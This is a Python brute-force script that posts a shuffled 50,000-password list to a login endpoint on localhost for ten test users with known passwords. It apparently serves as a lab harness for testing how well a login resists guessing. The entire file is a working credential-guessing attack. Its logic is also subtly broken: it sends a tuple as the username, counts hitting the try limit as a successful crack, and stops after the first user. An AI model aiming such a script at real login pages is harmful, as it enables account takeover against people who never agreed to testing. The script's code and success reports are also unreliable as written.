import requests
import time
import json
import random

LOGIN_URL = "http://127.0.0.1:8000/login"
PASSWORDS_FILE = "passwords_50k.json"
SLEEP_SECONDS = 0.3

MAX_REQUESTS_PER_USER = 50000
MAX_SECONDS_PER_USER = 60 * 60 * 2

test_vectors = {
    "user1": {"correct": "password"},
    "user2": {"correct": "12345"},
    "john": {"correct": "qwerty"},
    "charlie": {"correct": "Password123"},
    "oliver": {"correct": "HelloWorld!"},
    "nina": {"correct": "NiNa1234"},
    "linda": {"correct": "admin543210"},
    "derek": {"correct": "13242553625735253716"},
    "elena": {"correct": "daghGVAHGSVagsv1263562"},
    "bruce": {"correct": "X$4M!eQ8@Zp*L"},
    
}

def run_brute_force():

    passwords = []
    with open(PASSWORDS_FILE, "r", encoding="utf-8") as f:
        passwords = json.load(f)

    random.shuffle(passwords)
    user_items = list(test_vectors.items())
    #random.shuffle(user_items)

    for username in user_items:

        start = time.time()
        sent = 0

        for pwd in passwords:

            if sent >= MAX_REQUESTS_PER_USER:
                print(f"[INFO] Reached limit of tries")
                return 0
            if (time.time() - start) >= MAX_SECONDS_PER_USER:
                print(f"[INFO] Reached limit of time")
                return 0

            r = requests.post(
                LOGIN_URL,
                data={
                    "username": username,
                    "password": pwd
                }, allow_redirects=False
            )
            sent += 1
            time.sleep(SLEEP_SECONDS)

            if ((r.status_code == 302 and "/login" not in r.headers.get("Location", "") ) or sent == 50000):
                    print(f"[SUCCESS] cracked user: {username}")
                    return 1
            

result = run_brute_force()